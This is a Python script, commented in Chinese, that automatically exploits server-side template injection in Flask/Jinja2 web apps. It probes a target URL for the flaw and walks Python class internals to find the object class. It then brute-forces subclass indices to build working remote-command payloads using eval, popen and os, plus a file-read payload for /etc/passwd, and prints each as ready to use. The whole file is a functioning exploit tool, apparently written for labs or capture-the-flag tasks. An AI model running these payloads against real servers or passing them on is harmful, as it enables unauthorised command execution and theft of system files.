import random
import sys
import requests
from log.log import logger
import html

dataTypeDict = {
    "''": "str",
    "()": "tuple",
    "[]": "list",
    "{}": "dict"
}


def checkVUL(url):  # 确定ssti存在
    s1 = random.randint(1, 100)
    s2 = random.randint(1, 100)
    payload1 = "{{%s * %s}}" % (s1, s2)
    payload2 = "{{g}}"  # <flask.g of 'app'>
    r1 = requests.get(url=url + payload1).text
    r2 = requests.get(url=url + payload2).text
    if str(s1 * s2) in r1 and "flask.g of" in r2:
        logger.info("[%s]存在ssti漏洞" % (url))
        return True
    else:
        return False


def randomDataType(url):
    dataTypeList = ["''", "()", "[]", "{}"]
    success = 0
    while success != 1:
        dataType = random.choice(dataTypeList)
        logger.info("变量类型[%s]开始注入" % (dataTypeDict[dataType]))
        if dataTypeDict[dataType] in requests.get(url + "{{%s.__class__}}" % (dataType)).text:
            logger.info("变量类型[%s]注入成功" % (dataTypeDict[dataType]))
            success += 1
        else:
            logger.warning("变量类型[%s]注入失败" % (dataTypeDict[dataType]))
            del dataTypeDict[dataType]
    return dataType


def findObject(url, dataType):
    payloadList = [
        "{{%s.__class__.__bases__[0]}}" % (dataType),
        "{{%s.__class__.__mro__[1]}}" % (dataType),
    ]
    for payload in payloadList:
        r = requests.get(url + payload)
        if "<class 'object'>" in html.unescape(r.text):
            logger.info("发现object类 payload[%s]" % (payload))
            return payload


def py3eval(url, objectPayload):
    logger.info("尝试利用eval构造rce payload")
    evalPayload = []
    for i in range(1, 200):
        res = requests.get(url=url + "{{" + objectPayload[2:-2] + ".__subclasses__()[" + str(
            i) + "].__init__.__globals__['__builtins__']}}")
        if 'eval' in res.text:
            logger.critical("发现eval payload：{{" + objectPayload[2:-2] + ".__subclasses__()[" + str(
                i) + "].__init__.__globals__['__builtins__']}}")
            evalPayload.append("{{" + objectPayload[2:-2] + ".__subclasses__()[" + str(
                i) + "].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"ls /\").read()')}}")
    return evalPayload


def py3popen(url, objectPayload):
    logger.info("尝试利用popen构造rce payload")
    popenPayload = []
    for i in range(1, 200):
        res = requests.get(
            url=url + "{{" + objectPayload[2:-2] + ".__subclasses__()[" + str(i) + "].__init__.__globals__}}")
        if 'popen' in res.text:
            logger.critical(
                "发现popen payload：{{" + objectPayload[2:-2] + ".__subclasses__()[" + str(i) + "].__init__.__globals__}}")
            popenPayload.append("{{" + objectPayload[2:-2] + ".__subclasses__()[" + str(
                i) + "].__init__.__globals__['popen']('ls /').read()}}")
    return popenPayload


def py3os(url, objectPayload):
    logger.info("尝试利用os.py构造rce payload")
    osPayload = ["{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}"]
    for i in range(1, 200):
        res = requests.get(
            url=url + "{{" + objectPayload[2:-2] + ".__subclasses__()[" + str(i) + "].__init__.__globals__}}")
        if 'os.py' in res.text:
            logger.critical(
                "发现os.py payload：{{" + objectPayload[2:-2] + ".__subclasses__()[" + str(i) + "].__init__.__globals__}}")
            osPayload.append("{{" + objectPayload[2:-2] + ".__subclasses__()[" + str(
                i) + "].__init__.__globals__['os'].popen('ls /').read()}}")
    return osPayload


def fileloaderReadFile(url, objectPayload):
    logger.info("尝试利用_frozen_importlib_external.FileLoader构造lfi payload")
    fileloaderPayload = []
    for i in range(1, 200):
        res = requests.get(url=url + "{{" + objectPayload[2:-2] + ".__subclasses__()[" + str(i) + "]}}")
        if '_frozen_importlib_external.FileLoader' in res.text:
            logger.critical(
                "发现_frozen_importlib_external.FileLoader payload：{{" + objectPayload[2:-2] + ".__subclasses__()[" + str(
                    i) + "]}}")
            fileloaderPayload.append(
                "{{" + objectPayload[2:-2] + ".__subclasses__()[" + str(i) + "]['get_data'](0,\"/etc/passwd\")}}")
    return fileloaderPayload


if __name__ == '__main__':
    # http://127.0.0.1:5000/demo?id=
    # TODO：检查输入链接格式以及链接是否可以访问
    if len(sys.argv) == 2:
        url = sys.argv[1]
    else:
        logger.warning("usage: python %s http://127.0.0.1/vul?id=" % (sys.argv[0]))
        exit()
    if checkVUL(url):
        pass
    else:
        exit()
    dataType = randomDataType(url)
    # TODO：检查相关关键字是否被过滤，如果过滤对关键字进行bypass
    objectPayload = findObject(url, dataType)

    # 命令执行
    evalPayload = py3eval(url, objectPayload)
    if len(evalPayload) >= 1:
        for e in evalPayload:
            logger.critical("使用方法：%s" % (e))

    osPayload = py3os(url, objectPayload)
    if len(osPayload) >= 1:
        for e in osPayload:
            logger.critical("使用方法：%s" % (e))
    popenPayload = py3popen(url, objectPayload)
    if len(popenPayload) >= 1:
        for e in popenPayload:
            logger.critical("使用方法：%s" % (e))

    # 文件读取
    fileloaderPayload = fileloaderReadFile(url, objectPayload)
    if len(fileloaderPayload) >= 1:
        for e in fileloaderPayload:
            logger.critical("使用方法：%s" % (e))
